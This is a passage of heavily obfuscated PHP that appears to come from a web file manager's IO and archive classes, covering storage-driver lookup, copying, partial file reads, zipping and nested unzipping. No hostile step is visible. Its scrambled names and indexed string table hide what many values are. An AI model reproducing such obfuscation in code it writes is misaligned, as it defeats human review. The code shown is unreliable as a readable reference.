else { if ($¹‹Šûç¤ == count($Èô…˜”§) - 1 && $àì¥ÂµÈ > $Èô…˜”§[$¹‹Šûç¤]) { $àì¥ÂµÈ = $Èô…˜”§[$¹‹Šûç¤]; break; } } } } $œúÌò§ = self::driverMake($™©ã¯İø); if ($œúÌò§->isFileOutServer()) { return $œúÌò§->fileOutImageServer($™©ã¯İø, $àì¥ÂµÈ); } return $œúÌò§->fileOutImage($™©ã¯İø, $àì¥ÂµÈ); } private static function driverIsSame($±ƒ‡†¨õ, $²¾ºá’ˆ) { $ˆâš—­ =& $_SERVER[å¸¿•¶£]; $‘½Ğê²¸ = $±ƒ‡†¨õ->getType(); $úÂÈ ø¿ = $²¾ºá’ˆ->getType(); if ($‘½Ğê²¸ != $úÂÈ ø¿) { return !1; } if ($‘½Ğê²¸ == $ˆâš—­[764]) { return !0; } if ($‘½Ğê²¸ == $ˆâš—­[106]) { return !0; } if ($±ƒ‡†¨õ->pathDriver == $²¾ºá’ˆ->pathDriver) { return !0; } return !1; } public static function copyUpdate($·‚…„², $Ÿ÷âÖòÔ) { $©í¹ÁÌí =& $_SERVER[å¸¿•¶£]; if (!IO::exist($·‚…„²)) { return !1; } if (!IO::exist($Ÿ÷âÖòÔ)) { IO::mkdir($Ÿ÷âÖòÔ); } $¼áøÊàÄ = array_to_keyvalue(self::listAllSimple($·‚…„²), $©í¹ÁÌí[84]); $ûİé¤¾À = array_to_keyvalue(self::listAllSimple($Ÿ÷âÖòÔ), $©í¹ÁÌí[84]); $ı¶ù¶ Ï = array(); $»œõ”öì = array(); foreach ($¼áøÊàÄ as $Í¢úÚòŞ => $àáÃÖª¯) { if (isset($ûİé¤¾À[$Í¢úÚòŞ])) { if ($àáÃÖª¯[$©í¹ÁÌí[75]] == 1) { continue; } if ($ûİé¤¾À[$Í¢úÚòŞ][$©í¹ÁÌí[76]] == $àáÃÖª¯[$©í¹ÁÌí[76]]) { continue; } } if ($àáÃÖª¯[$©í¹ÁÌí[75]] == 1) { $»œõ”öì[] = $Ÿ÷âÖòÔ . $©í¹ÁÌí[8] . trim($Í¢úÚòŞ, $©í¹ÁÌí[8]); continue; } $€ùÏÂ©‚ = strstr(trim($Í¢úÚòŞ, $©í¹ÁÌí[8]), $©í¹ÁÌí[8]) ? get_path_father($Í¢úÚòŞ) : $©í¹ÁÌí[12]; $ı¶ù¶ Ï[] = array($©í¹ÁÌí[1167] => $àáÃÖª¯[$©í¹ÁÌí[86]], $©í¹ÁÌí[1168] => rtrim($Ÿ÷âÖòÔ, $©í¹ÁÌí[8]) . $©í¹ÁÌí[8] . $€ùÏÂ©‚, $©í¹ÁÌí[1169] => $àáÃÖª¯); } $·òö–ß‰ = array($©í¹ÁÌí[200] => $ı¶ù¶ Ï, $©í¹ÁÌí[75] => $»œõ”öì); Hook::trigger($©í¹ÁÌí[1170], $·‚…„², $Ÿ÷âÖòÔ, $·òö–ß‰); foreach ($»œõ”öì as $àáÃÖª¯) { IO::mkdir($àáÃÖª¯); } foreach ($ı¶ù¶ Ï as $àáÃÖª¯) { IO::copy($àáÃÖª¯[$©í¹ÁÌí[1167]], $àáÃÖª¯[$©í¹ÁÌí[1168]], REPEAT_REPLACE); } } public static function fileSubstr($¯…åíƒÁ, $®‰ ±Š, $¹çŸË¨à = false) { $•¤ÊÆ’– =& $_SERVER[å¸¿•¶£]; $Û´Íâ¾İ = self::driverMake($¯…åíƒÁ); $¹Ëú‚ô = $Û´Íâ¾İ->size($¯…åíƒÁ); $“Èµ» = $®‰ ±Š; $üğîáµ = $¹çŸË¨à; if ($®‰ ±Š < 0) { $®‰ ±Š = $¹Ëú‚ô + $®‰ ±Š; } if ($¹çŸË¨à === !1) { $¹çŸË¨à = $¹Ëú‚ô - $®‰ ±Š; } if ($®‰ ±Š + $¹çŸË¨à > $¹Ëú‚ô) { $¹çŸË¨à = $¹Ëú‚ô - $®‰ ±Š; } if (!$¹Ëú‚ô && $Û´Íâ¾İ->getType() == $•¤ÊÆ’–[106] && !$Û´Íâ¾İ->exist($¯…åíƒÁ)) { $¨Ñ÷¾‰ = get_path_this($¯…åíƒÁ); $—Ğ¹‹ä = parse_url_query($¨Ñ÷¾‰); if (is_array($—Ğ¹‹ä) && isset($—Ğ¹‹ä[$•¤ÊÆ’–[32]])) { $¨Ñ÷¾‰ = urldecode($—Ğ¹‹ä[$•¤ÊÆ’–[32]]); } throw new Exception($•¤ÊÆ’–[1171] . LNG($•¤ÊÆ’–[1172]) . $•¤ÊÆ’–[973] . clear_html($¨Ñ÷¾‰) . $•¤ÊÆ’–[12]); } if ($¹çŸË¨à <= 0) { return $•¤ÊÆ’–[12]; } if ($®‰ ±Š < 0 || $®‰ ±Š >= $¹Ëú‚ô || $¹çŸË¨à > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\x65\122\x65\141\x64\x20\x65\162\162\x6f\x72\x21\x20\163\164\x61\x72\164\x3d{$®‰ ±Š}\73\154\x65\156\147\164\150\75{$¹çŸË¨à}\73\40\x73\x69\x7a\145\x3d{$¹Ëú‚ô}\x3b"); } $ìÀŸÆÒÛ = $Û´Íâ¾İ->fileSubstr($¯…åíƒÁ, $®‰ ±Š, $¹çŸË¨à); if (!$ìÀŸÆÒÛ && $¹çŸË¨à && isset($GLOBALS[$•¤ÊÆ’–[1173]])) { throw new Exception($GLOBALS[$•¤ÊÆ’–[1173]][$•¤ÊÆ’–[1174]]); } return $ìÀŸÆÒÛ; } private static function driverMake(&$´×ÓÇ‰é) { $™³ˆá¶È =& $_SERVER[å¸¿•¶£]; $ĞôÂâàû = KodIO::parse($´×ÓÇ‰é); if (!self::$driverListSystem) { $Ô–ûü™Ã = Model($™³ˆá¶È[774])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ô–ûü™Ã, $™³ˆá¶È[399]); } if ($ĞôÂâàû[$™³ˆá¶È[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ĞôÂâàû[$™³ˆá¶È[399]]]) { return !1; } $´×ÓÇ‰é = $ĞôÂâàû[$™³ˆá¶È[1175]]; $Ş³øˆÒ— = self::driverGet($ĞôÂâàû, $´×ÓÇ‰é); return $Ş³øˆÒ—; } private static function driverGet($©îæûŞ©, &$ˆÊÂ«´ˆ) { $ãæÑ²× =& $_SERVER[å¸¿•¶£]; $÷·œ İ´ = $©îæûŞ©[$ãæÑ²×[1176]]; $»èÅ = $©îæûŞ©[$ãæÑ²×[399]]; switch ($©îæûŞ©[$ãæÑ²×[33]]) { case KodIO::KOD_IO: $†¯•¦Ö = self::$driverListSystem[$»èÅ]; break; case KodIO::KOD_SOURCE: $ˆÊÂ«´ˆ = $»èÅ . $ˆÊÂ«´ˆ; $†¯•¦Ö = array($ãæÑ²×[1177] => $ãæÑ²×[1178], $ãæÑ²×[6] => $©îæûŞ©); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $É°Æ†¤¶ = $GLOBALS[$ãæÑ²×[1179]]; self::$driverListUser = array_to_keyvalue($É°Æ†¤¶, $ãæÑ²×[399]); } $†¯•¦Ö = self::$driverListUser[$»èÅ]; break; case KodIO::KOD_SHARE_LINK: $†¯•¦Ö = array($ãæÑ²×[1177] => $ãæÑ²×[1180], $ãæÑ²×[6] => $©îæûŞ©); $ÒÏáò­è = Action($ãæÑ²×[1181])->sharePathInfo($©îæûŞ©[$ãæÑ²×[84]]); $ˆÊÂ«´ˆ = $ÒÏáò­è[$ãæÑ²×[402]]; if (!$ÒÏáò­è[$ãæÑ²×[402]]) { $Øçì®ò = Model($ãæÑ²×[592])->getInfo($ÒÏáò­è[$ãæÑ²×[593]]); $ˆÊÂ«´ˆ = KodIO::clear($Øçì®ò[$ãæÑ²×[1182]] . $©îæûŞ©[$ãæÑ²×[1175]]); $©îæûŞ©[$ãæÑ²×[486]] = $Øçì®ò; $©îæûŞ©[$ãæÑ²×[1158]] = $ˆÊÂ«´ˆ; $†¯•¦Ö = array($ãæÑ²×[1177] => $ãæÑ²×[1183], $ãæÑ²×[6] => $©îæûŞ©); } break; case KodIO::KOD_SHARE_ITEM: $†¯•¦Ö = array($ãæÑ²×[1177] => $ãæÑ²×[1184], $ãæÑ²×[6] => $©îæûŞ©); $Øçì®ò = Model($ãæÑ²×[592])->getInfo($©îæûŞ©[$ãæÑ²×[399]]); if ($Øçì®ò[$ãæÑ²×[402]] == $ãæÑ²×[198]) { $ˆÊÂ«´ˆ = KodIO::clear($Øçì®ò[$ãæÑ²×[1182]] . $©îæûŞ©[$ãæÑ²×[1175]]); $©îæûŞ©[$ãæÑ²×[486]] = $Øçì®ò; $©îæûŞ©[$ãæÑ²×[1158]] = $ˆÊÂ«´ˆ; $†¯•¦Ö = array($ãæÑ²×[1177] => $ãæÑ²×[1185], $ãæÑ²×[6] => $©îæûŞ©); } else { if (!$ˆÊÂ«´ˆ) { $ˆÊÂ«´ˆ = $Øçì®ò[$ãæÑ²×[402]]; } } break; default: $ˆÊÂ«´ˆ = $©îæûŞ©[$ãæÑ²×[84]]; $†¯•¦Ö = array($ãæÑ²×[1177] => $ãæÑ²×[1186]); break; } $ñàüğàë = $©îæûŞ©[$ãæÑ²×[84]]; if (!isset(self::$driverCache[$ñàüğàë])) { $Şùù¨û¾ = strtolower($†¯•¦Ö[$ãæÑ²×[95]]); $®è­éèş = $GLOBALS[$ãæÑ²×[6]][$ãæÑ²×[89]][$ãæÑ²×[833]]; $‹Ï°¯› = $ãæÑ²×[74] . (isset($®è­éèş[$Şùù¨û¾]) ? $®è­éèş[$Şùù¨û¾] : ucfirst($Şùù¨û¾)); if (!class_exists($‹Ï°¯›)) { show_json("{$‹Ï°¯›}\40\156\x6f\x74\40\145\x78\x69\163\x74\x73\x21", !1); } $Óí§‹Á = isset($†¯•¦Ö[$ãæÑ²×[6]]) ? $†¯•¦Ö[$ãæÑ²×[6]] : !1; self::$driverCache[$ñàüğàë] = new $‹Ï°¯›($Óí§‹Á); } $†¦©Øèƒ = self::$driverCache[$ñàüğàë]; $†¦©Øèƒ->pathDriver = $÷·œ İ´; $†¦©Øèƒ->pathBase = $ãæÑ²×[12]; if (isset($†¯•¦Ö[$ãæÑ²×[6]][$ãæÑ²×[1187]])) { $†¦©Øèƒ->pathBase = rtrim($†¯•¦Ö[$ãæÑ²×[6]][$ãæÑ²×[1187]], $ãæÑ²×[8]) . $ãæÑ²×[8]; $ˆÊÂ«´ˆ = $†¦©Øèƒ->pathBase . ltrim($ˆÊÂ«´ˆ, $ãæÑ²×[8]); } $ˆÊÂ«´ˆ = $†¦©Øèƒ->getPath($ˆÊÂ«´ˆ); if (isset($©îæûŞ©[$ãæÑ²×[1158]])) { $ˆÊÂ«´ˆ = $©îæûŞ©[$ãæÑ²×[1158]]; } $†¦©Øèƒ->path = $ˆÊÂ«´ˆ; return $†¦©Øèƒ; } public static function errorTips($×ª€ø¡— = false) { $¯îêÈ¢¥ =& $_SERVER[å¸¿•¶£]; static $‹ŠÆıáÄ = array(); $¢ “¡Ì = 1000; if ($×ª€ø¡— === -1) { return $‹ŠÆıáÄ ? $‹ŠÆıáÄ[count($‹ŠÆıáÄ) - 1] : $¯îêÈ¢¥[12]; } if ($×ª€ø¡— === !1) { return implode($¯îêÈ¢¥[231], $‹ŠÆıáÄ); } if (count($‹ŠÆıáÄ) >= $¢ “¡Ì) { $‹ŠÆıáÄ = array_slice($‹ŠÆıáÄ, $¢ “¡Ì * 0.5, $¢ “¡Ì); } $‹ŠÆıáÄ[] = $×ª€ø¡—; write_log($¯îêÈ¢¥[162] . ACTION . $¯îêÈ¢¥[1188] . $×ª€ø¡—, $¯îêÈ¢¥[1189]); } public static function getLastError($Åîğ—† = '') { $áôó¥Ä¶ = self::errorTips(-1); return $áôó¥Ä¶ ? $áôó¥Ä¶ : $Åîğ—†; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $À¸°ÕÃ¦; if ($À¸°ÕÃ¦) { return $À¸°ÕÃ¦; } $´˜š¨ïí = IO::init($_SERVER[å¸¿•¶£][8]); return $´˜š¨ïí; } private static function iconvSystem($±¦²ß¶) { return self::local()->iconvSystem($±¦²ß¶); } private static function iconvApp($ìîâ®ñß) { return self::local()->iconvApp($ìîâ®ñß); } public static function zipFolder($Õüä÷, $µş€µ™Í = "\x7a\x69\x70", $˜„Ô¸¾ç = '', $Ñ“„– = REPEAT_RENAME) { $Çû¥©ºÇ =& $_SERVER[å¸¿•¶£]; $±‘¿Íå = IO::listPath($Õüä÷); if (!$±‘¿Íå) { return !1; } $±‘¿Íå = array_merge($±‘¿Íå[$Çû¥©ºÇ[82]], $±‘¿Íå[$Çû¥©ºÇ[83]]); return self::zip($±‘¿Íå, $µş€µ™Í, $˜„Ô¸¾ç, $Ñ“„–); } public static function zip($Ôà‘Â±á, $á•ì„½© = "\172\x69\160", $µè… ‚ = '', $ÇÓÁ¢ù = REPEAT_RENAME) { $ÛÖ¤ı‘ñ =& $_SERVER[å¸¿•¶£]; if (is_string($Ôà‘Â±á) && $Ôà‘Â±á) { $Ôà‘Â±á = array(array($ÛÖ¤ı‘ñ[84] => $Ôà‘Â±á)); } $¤òë­ø¨ = self::init($Ôà‘Â±á[0][$ÛÖ¤ı‘ñ[84]]); $¹Íõ¨ÊÚ = self::info($Ôà‘Â±á[0][$ÛÖ¤ı‘ñ[84]]); $°åìêÚ¢ = $ÛÖ¤ı‘ñ[12]; $‚ÀĞöªÍ = $ÛÖ¤ı‘ñ[12]; $—‘â×Ó¬ = $ÛÖ¤ı‘ñ[12]; if ($µè… ‚ && substr($µè… ‚, -1, 1) != $ÛÖ¤ı‘ñ[8]) { $‚ÀĞöªÍ = get_path_father($µè… ‚); $—‘â×Ó¬ = get_path_this($µè… ‚); } else { $‚ÀĞöªÍ = self::pathFather($¹Íõ¨ÊÚ[$ÛÖ¤ı‘ñ[84]]); $—‘â×Ó¬ = $¹Íõ¨ÊÚ[$ÛÖ¤ı‘ñ[32]] . $ÛÖ¤ı‘ñ[10] . $á•ì„½©; if (count($Ôà‘Â±á) > 1) { $’·¿–‚ = IO::info($‚ÀĞöªÍ); $—‘â×Ó¬ = $’·¿–‚[$ÛÖ¤ı‘ñ[32]] . $ÛÖ¤ı‘ñ[10] . $á•ì„½©; } if ($µè… ‚) { $‚ÀĞöªÍ = $µè… ‚; } } if ($¤òë­ø¨->getType() == $ÛÖ¤ı‘ñ[106]) { $µ›–Óøˆ = self::init($‚ÀĞöªÍ); $¦‰¨÷‰Ê = $µ›–Óøˆ->getType() == $ÛÖ¤ı‘ñ[106] ? $‚ÀĞöªÍ : get_path_father($¤òë­ø¨->path); $¦‰¨÷‰Ê = rtrim($¦‰¨÷‰Ê, $ÛÖ¤ı‘ñ[8]) . $ÛÖ¤ı‘ñ[8]; mk_dir($¦‰¨÷‰Ê); } else { $°åìêÚ¢ = TEMP_FILES . $ÛÖ¤ı‘ñ[1190] . time() . rand_string(8) . $ÛÖ¤ı‘ñ[8]; mk_dir($°åìêÚ¢); file_put_contents($°åìêÚ¢ . $ÛÖ¤ı‘ñ[1191], $ÛÖ¤ı‘ñ[12]); $¦‰¨÷‰Ê = $°åìêÚ¢; } $ùÉÙ°õÅ = IO::info($¦‰¨÷‰Ê); if (!$ùÉÙ°õÅ || !$ùÉÙ°õÅ[$ÛÖ¤ı‘ñ[203]]) { show_json(LNG($ÛÖ¤ı‘ñ[1192]), !1); } $ôíÅ¼– = self::zipFileList($Ôà‘Â±á, $°åìêÚ¢); foreach ($ôíÅ¼– as $ËÊú¦üõ => $À­Öèµ³) { $ôíÅ¼–[$ËÊú¦üõ] = self::iconvSystem($À­Öèµ³); } $ôÍıúáŒ = get_filename_auto($¦‰¨÷‰Ê . $—‘â×Ó¬, $ÛÖ¤ı‘ñ[12], $ÇÓÁ¢ù); KodArchive::create(self::iconvSystem($ôÍıúáŒ), $ôíÅ¼–); if (!IO::exist($ôÍıúáŒ)) { if ($°åìêÚ¢) { del_dir($°åìêÚ¢); } show_json(LNG($ÛÖ¤ı‘ñ[1193]), !1); } if (!$°åìêÚ¢) { return $ôÍıúáŒ; } $ÀÙ±ß±­ = self::move($ôÍıúáŒ, $‚ÀĞöªÍ, $ÇÓÁ¢ù); if ($°åìêÚ¢) { del_dir($°åìêÚ¢); } if (!$ôÍıúáŒ) { show_json(LNG($ÛÖ¤ı‘ñ[1193]), !1); } return $ÀÙ±ß±­; } public static function unzip($ˆ¿¶Ö‹œ, $õÒ„şğ•, $È½ä¶õŞ = "\55\61", $¶’ñîª = "\x72\145\160\x6c\x61\143\145") { $³îó¨Çá =& $_SERVER[å¸¿•¶£]; $ÁËôóâç = parent::info($ˆ¿¶Ö‹œ); if (!$ÁËôóâç) { show_json(LNG($³îó¨Çá[1194]), !1); } $úæîéÒø = IO::infoFull($õÒ„şğ•); if (!$úæîéÒø) { $õÒ„şğ• = IO::mkdir($õÒ„şğ•); } if (isset($úæîéÒø[$³îó¨Çá[402]]) && trim($úæîéÒø[$³îó¨Çá[84]], $³îó¨Çá[8]) != trim($õÒ„şğ•, $³îó¨Çá[8])) { $·’”ùÓˆ = KodIO::make($úæîéÒø[$³îó¨Çá[432]]); $ûŸ¨ß¦ = IO::fileNameAuto($·’”ùÓˆ, $úæîéÒø[$³îó¨Çá[32]], REPEAT_RENAME_FOLDER, !0); $õÒ„şğ• = IO::mkdir($·’”ùÓˆ . $ûŸ¨ß¦); } $È½ä¶õŞ = $È½ä¶õŞ && $È½ä¶õŞ != $³îó¨Çá[1195] ? @json_decode($È½ä¶õŞ, !0) : -1; $Ÿ¥šô¤å = self::unzipPart($ˆ¿¶Ö‹œ, $È½ä¶õŞ); if (!$Ÿ¥šô¤å || !IO::exist($Ÿ¥šô¤å[$³îó¨Çá[200]])) { show_json(LNG($³îó¨Çá[105]), !1); } $§€œ’Äµ = $Ÿ¥šô¤å[$³îó¨Çá[1196]][count($Ÿ¥šô¤å[$³îó¨Çá[1196]]) - 1]; if ($§€œ’Äµ[$³îó¨Çá[1197]] == -1 || substr($§€œ’Äµ[$³îó¨Çá[32]], -1, 1) == $³îó¨Çá[8]) { $ïƒâ¢©Ú = $Ÿ¥šô¤å[$³îó¨Çá[1198]] . rand_string(10) . $³îó¨Çá[8]; mk_dir($ïƒâ¢©Ú); $ÅğŸ¨¢ˆ = count($Ÿ¥šô¤å[$³îó¨Çá[1196]]) == 1 ? IO::ext($ˆ¿¶Ö‹œ) : get_path_ext($Ÿ¥šô¤å[$³îó¨Çá[200]]); $Î¼šó©Ÿ = KodArchive::extract(self::iconvSystem($Ÿ¥šô¤å[$³îó¨Çá[200]]), $ïƒâ¢©Ú, $§€œ’Äµ[$³îó¨Çá[1197]], $ûŸ¨ß¦, $ÅğŸ¨¢ˆ); self::unzipErrorCheck($Î¼šó©Ÿ, array($³îó¨Çá[1199], $ˆ¿¶Ö‹œ, $ÅğŸ¨¢ˆ, $õÒ„şğ•, $Ÿ¥šô¤å)); Hook::trigger($³îó¨Çá[1200], $ïƒâ¢©Ú); recursion_dir($ïƒâ¢©Ú, $à¦ÃíÂº, $‰ûãÄÅ, 0); $¯²·ŸÛ = array_merge($à¦ÃíÂº, $‰ûãÄÅ); $ññ¨Ã°¡ = array(); foreach ($¯²·ŸÛ as $Û¤ĞÀ¤ë) { $²êŒƒ®Â = IO::move(self::iconvApp($Û¤ĞÀ¤ë), $õÒ„şğ•, $¶’ñîª); if ($²êŒƒ®Â) { $ññ¨Ã°¡[] = $²êŒƒ®Â; } } del_dir($ïƒâ¢©Ú); } else { $²êŒƒ®Â = IO::move($Ÿ¥šô¤å[$³îó¨Çá[200]], $õÒ„şğ•, $¶’ñîª, get_path_this($§€œ’Äµ[$³îó¨Çá[32]])); if ($²êŒƒ®Â) { $ññ¨Ã°¡[] = $²êŒƒ®Â; } } return $ññ¨Ã°¡ ? $ññ¨Ã°¡ : !1; } public static function unzipList($ê©àÚù) { $Ïçè ‚è =& $_SERVER[å¸¿•¶£]; $ëá“ƒÖ¦ = isset($ê©àÚù[$Ïçè ‚è[1201]]) ? $ê©àÚù[$Ïçè ‚è[1201]] : !1; $œ‰ğ¸ºÎ = isset($ê©àÚù[$Ïçè ‚è[1197]]) ? @json_decode($ê©àÚù[$Ïçè ‚è[1197]], !0) : -1; $ÅØÙŠ“£ = self::unzipPart($ê©àÚù[$Ïçè ‚è[84]], $œ‰ğ¸ºÎ); if (!$ÅØÙŠ“£ || !IO::exist($ÅØÙŠ“£[$Ïçè ‚è[200]])) { show_json(LNG($Ïçè ‚è[105]), !1); } $£Œ­³åå = $ÅØÙŠ“£[$Ïçè ‚è[1196]][count($ÅØÙŠ“£[$Ïçè ‚è[1196]]) - 1]; $µ’ÊŠ = in_array(IO::ext($ÅØÙŠ“£[$Ïçè ‚è[200]]), array($Ïçè ‚è[313], $Ïçè ‚è[1202], $Ïçè ‚è[1203], $Ïçè ‚è[1204], $Ïçè ‚è[1205], $Ïçè ‚è[1206])); if (!$ëá“ƒÖ¦ && ($£Œ­³åå[$Ïçè ‚è[1197]] == -1 || $µ’ÊŠ)) { $×¦úöçœ = $ÅØÙŠ“£[$Ïçè ‚è[1198]] . get_path_this($ÅØÙŠ“£[$Ïçè ‚è[200]]) . $Ïçè ‚è[1207]; if (!IO::exist($×¦úöçœ)) { $ğ­»å¸¦ = $£Œ­³åå[$Ïçè ‚è[1197]] == -1 ? get_path_ext(IO::pathThis($ê©àÚù[$Ïçè ‚è[84]])) : get_path_ext($ÅØÙŠ“£[$Ïçè ‚è[200]]); $ŠŸ¼ƒˆ = KodArchive::listContent(self::iconvSystem($ÅØÙŠ“£[$Ïçè ‚è[200]]), !0, $ğ­»å¸¦); self::unzipErrorCheck($ŠŸ¼ƒˆ, array($Ïçè ‚è[1208], $ê©àÚù, $ÅØÙŠ“£)); @file_put_contents($×¦úöçœ, json_encode($ŠŸ¼ƒˆ[$Ïçè ‚è[1209]])); } return @json_decode(IO::getContent($×¦úöçœ), !0); } IO::fileOut($ÅØÙŠ“£[$Ïçè ‚è[200]], $ëá“ƒÖ¦, get_path_this($£Œ­³åå[$Ïçè ‚è[32]])); die; } private static function zipFileList($¦Šªá‡, $Í®úê¶® = false) { $ Å›ò»… =& $_SERVER[å¸¿•¶£]; $§™Ì…Î = array(); foreach ($¦Šªá‡ as $†¶‘úÎ) { $™…æ÷âğ = $†¶‘úÎ[$ Å›ò»…[84]]; if ($Í®úê¶®) { $™…æ÷âğ = self::copy($†¶‘úÎ[$ Å›ò»…[84]], $Í®úê¶®, $ Å›ò»…[825]); } else { $éÁÊ¢£÷ = self::init($†¶‘úÎ[$ Å›ò»…[84]]); if ($éÁÊ¢£÷->getType() == $ Å›ò»…[106]) { $™…æ÷âğ = $éÁÊ¢£÷->path; } } if ($™…æ÷âğ && self::local()->exist($™…æ÷âğ)) { $§™Ì…Î[$†¶‘úÎ[$ Å›ò»…[84]]] = $™…æ÷âğ; } } if (!empty($§™Ì…Î)) { return array_values($§™Ì…Î); } show_json(LNG($ Å›ò»…[1172]), !1); } private static function localFilePath($Á¼Œ¿±ı) { $ÏÇ·Ø²ã =& $_SERVER[å¸¿•¶£]; $·ÇËğ¨ş = KodIO::parse($Á¼Œ¿±ı); if ($·ÇËğ¨ş[$ÏÇ·Ø²ã[33]] == KodIO::KOD_SOURCE) { $û´œ£Ä£ = Model($ÏÇ·Ø²ã[832])->fileInfoGet(KodIO::sourceID($Á¼Œ¿±ı)); if (!$û´œ£Ä£[$ÏÇ·Ø²ã[84]]) { show_json($ÏÇ·Ø²ã[1210], !1); } $Á¼Œ¿±ı = $û´œ£Ä£[$ÏÇ·Ø²ã[84]]; } $€Æåú£æ = self::init($Á¼Œ¿±ı); if ($€Æåú£æ->pathParse[$ÏÇ·Ø²ã[1158]]) { $Á¼Œ¿±ı = $€Æåú£æ->pathParse[$ÏÇ·Ø²ã[1158]]; $€Æåú£æ = self::init($Á¼Œ¿±ı); } $áºğ»Öë = $€Æåú£æ->getType(); if ($áºğ»Öë == $ÏÇ·Ø²ã[106] || $áºğ»Öë == $ÏÇ·Ø²ã[1211]) { if (!$€Æåú£æ->exist($€Æåú£æ->path)) { show_json(LNG($ÏÇ·Ø²ã[105]), !1); } return $€Æåú£æ->path; } return !1; } public static function unzipPart($Ô¾÷ªêÎ, $ëÀÙÓ’î = -1) { $‚¼ª«Ö¼ =& $_SERVER[å¸¿•¶£]; $šçÛ–ñ = IO::pathThis($Ô¾÷ªêÎ); if (!$ëÀÙÓ’î || $ëÀÙÓ’î == -1) { $¡éª‹º¾ = array(array($‚¼ª«Ö¼[32] => $šçÛ–ñ, $‚¼ª«Ö¼[1197] => -1)); $¡éª‹º¾[0][$‚¼ª«Ö¼[1212]] = $¡éª‹º¾[0][$‚¼ª«Ö¼[32]]; } else { if (is_array($ëÀÙÓ’î)) { $¡éª‹º¾ = $ëÀÙÓ’î; $ ³³Œü² = count($¡éª‹º¾) - 1; for ($Ó µ›¹Ô = 0; $Ó µ›¹Ô <= $ ³³Œü²; $Ó µ›¹Ô++) { $Í£İ™Â = $¡éª‹º¾[$Ó µ›¹Ô]; $¾íÚ»¸– = get_path_this($Í£İ™Â[$‚¼ª«Ö¼[32]]) . (checkExtSafe($Í£İ™Â[$‚¼ª«Ö¼[32]]) ? $‚¼ª«Ö¼[12] : $‚¼ª«Ö¼[1213]); $¡éª‹º¾[$Ó µ›¹Ô][$‚¼ª«Ö¼[1212]] = $‚¼ª«Ö¼[1214] . intval($Í£İ™Â[$‚¼ª«Ö¼[1197]]) . $‚¼ª«Ö¼[386] . $¾íÚ»¸–; if ($Ó µ›¹Ô == 0) { continue; } $¡éª‹º¾[$Ó µ›¹Ô][$‚¼ª«Ö¼[1212]] = $¡éª‹º¾[$Ó µ›¹Ô - 1][$‚¼ª«Ö¼[1212]] . $‚¼ª«Ö¼[1215] . $¡éª‹º¾[$Ó µ›¹Ô][$‚¼ª«Ö¼[1212]]; } } } if (!is_array($¡éª‹º¾) || count($¡éª‹º¾) == 0) { return !1; } $ìíøºÎ™ = $¡éª‹º¾[count($¡éª‹º¾) - 1]; if (!IO::exist($Ô¾÷ªêÎ)) { return !1; } $Ø¸”çìÖ = TEMP_FILES . $‚¼ª«Ö¼[1216] . kodIO::hashPathSafe($Ô¾÷ªêÎ) . $‚¼ª«Ö¼[8]; $‡· Ëç¸ = $Ø¸”çìÖ . $ìíøºÎ™[$‚¼ª«Ö¼[1212]]; mk_dir($Ø¸”çìÖ); file_put_contents(TEMP_FILES . $‚¼ª«Ö¼[1191], $‚¼ª«Ö¼[12]); if (IO::exist($‡· Ëç¸)) { return array($‚¼ª«Ö¼[200] => $‡· Ëç¸, $‚¼ª«Ö¼[1196] => $¡éª‹º¾, $‚¼ª«Ö¼[1198] => $Ø¸”çìÖ); } $·Úµø™ = self::localFilePath($Ô¾÷ªêÎ); if (!$·Úµø™) { $·Úµø™ = $Ø¸”çìÖ . $‚¼ª«Ö¼[1217]; if (!IO::exist($·Úµø™)) { self::copy($Ô¾÷ªêÎ, $Ø¸”çìÖ, !1, get_path_this($·Úµø™)); } } if (!$·Úµø™ || !IO::exist($·Úµø™)) { return !1; } if ($ìíøºÎ™[$‚¼ª«Ö¼[1197]] == -1) { return array($‚¼ª«Ö¼[200] => $·Úµø™, $‚¼ª«Ö¼[1196] => $¡éª‹º¾, $‚¼ª«Ö¼[1198] => $Ø¸”çìÖ); } $ˆşÅ“œ¿ = $·Úµø™; foreach ($¡éª‹º¾ as $Ó µ›¹Ô => $Í£İ™Â) { if (!$Í£İ™Â || $Í£İ™Â[$‚¼ª«Ö¼[1197]] == $‚¼ª«Ö¼[1195]) { break; } if (substr($Í£İ™Â[$‚¼ª«Ö¼[32]], -1, 1) == $‚¼ª«Ö¼[8]) { break; } $×¿çıÃ = in_array(get_path_ext($Í£İ™Â[$‚¼ª«Ö¼[1212]]), array($‚¼ª«Ö¼[313], $‚¼ª«Ö¼[1202], $‚¼ª«Ö¼[1203], $‚¼ª«Ö¼[1204], $‚¼ª«Ö¼[1205], $‚¼ª«Ö¼[1206])); $æÛì¦œÛ = $Ó µ›¹Ô == count($¡éª‹º¾) - 1 && $×¿çıÃ; $¤œÎâãŸ = $Ø¸”çìÖ . $Í£İ™Â[$‚¼ª«Ö¼[1212]]; $áãè–Âû = $Ø¸”çìÖ . get_path_this($Í£İ™Â[$‚¼ª«Ö¼[32]]); if (IO::exist($¤œÎâãŸ)) { $ˆşÅ“œ¿ = $¤œÎâãŸ; continue; } $ĞÎ¦ıÚÖ = $Ó µ›¹Ô == 0 ? get_path_ext($šçÛ–ñ) : get_path_ext($ˆşÅ“œ¿); $¹»™Ø© = KodArchive::extract(self::iconvSystem($ˆşÅ“œ¿), $Ø¸”çìÖ, $Í£İ™Â[$‚¼ª«Ö¼[1197]], $…ŒÃÜµ÷, $ĞÎ¦ıÚÖ); self::unzipErrorCheck($¹»™Ø©, array($‚¼ª«Ö¼[1218], $Ô¾÷ªêÎ, $¡éª‹º¾, $Í£İ™Â, $¤œÎâãŸ)); if (IO::exist($áãè–Âû)) { IO::rename($áãè–Âû, get_path_this($¤œÎâãŸ)); } $ˆşÅ“œ¿ = $¤œÎâãŸ; } $‡· Ëç¸ = $ˆşÅ“œ¿; return array($‚¼ª«Ö¼[200] => $ˆşÅ“œ¿, $‚¼ª«Ö¼[1196] => $¡éª‹º¾, $‚¼ª«Ö¼[1198] => $Ø¸”çìÖ); } private static function unzipErrorCheck($ªæ©‚Ã°, $•İûò = false) { $¦àÜØÈë =& $_SERVER[å¸¿•¶£]; if ($ªæ©‚Ã°[$¦àÜØÈë[1219]]) { return !0; } write_log(array($¦àÜØÈë[1220], $ªæ©‚Ã°, $•İûò), $¦àÜØÈë[1221]); show_json($¦àÜØÈë[1222] . 